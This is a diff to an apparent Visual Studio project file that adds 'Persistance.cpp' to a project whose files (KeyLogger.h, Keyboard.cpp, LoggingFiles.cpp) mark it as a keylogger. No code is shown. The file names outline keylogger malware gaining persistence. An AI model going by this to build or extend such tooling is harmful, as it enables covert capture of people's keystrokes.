@@ -158,6 +158,7 @@
     <ClCompile Include="Keyboard.cpp" />
     <ClCompile Include="LoggingFiles.cpp" />
     <ClCompile Include="KeyLoggerExample.cpp" />
+    <ClCompile Include="Persistance.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="KeyLogger.h" />
